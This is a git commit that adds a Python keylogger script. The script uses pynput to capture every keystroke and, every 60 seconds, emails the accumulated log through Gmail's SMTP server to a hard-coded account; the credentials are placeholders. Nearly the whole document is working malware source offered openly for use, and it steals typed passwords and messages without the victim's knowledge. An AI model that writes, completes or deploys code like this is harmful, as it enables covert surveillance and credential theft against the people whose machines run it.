8093f850126400ad87c9c0bb8e9760dddae6f465
Ch. Theodorou <theodoroucharalabos@gmail.com>
2019-05-25 17:09:47 +0300

    Create keyloger.py

---
+++ Keylogger/keyloger.py
@@ -0,0 +1,50 @@
+import pynput.keyboard
+import threading
+import smtplib
+
+
+
+class Keylogger:
+
+
+    def __init__(self, time_interval, email, password):
+        self.log = "Keylogger Started!"
+        self.interval = time_interval
+        self.email = email
+        self.password = password
+
+    def send_mail(self, email, password, message):
+        # this will create a instance of smtp server so we can send our email
+        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email,email,message)
+        server.quit()
+
+    def append_to_log(self, message):
+        self.log += message
+    
+    def process_key_press(self, key):
+        try:
+            self.append_to_log(str(key.char))
+        except AttributeError:
+            if key == key.space:
+                self.append_to_log(" ")
+            else:
+                self.append_to_log(" " + str(key) + " ")
+
+    def report(self):
+        self.send_mail(self.email, self.password, "\n\n" + self.log)
+        print(self.log)
+        self.log =""
+        timer = threading.Timer(self.interval, self.report)
+        timer.start()
+
+    def start(self):
+        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
+        with keyboard_listener:
+            self.report()
+            keyboard_listener.join()
+
+kl = Keylogger(60, "example@gmail.com", "dummypass")
+kl.start()
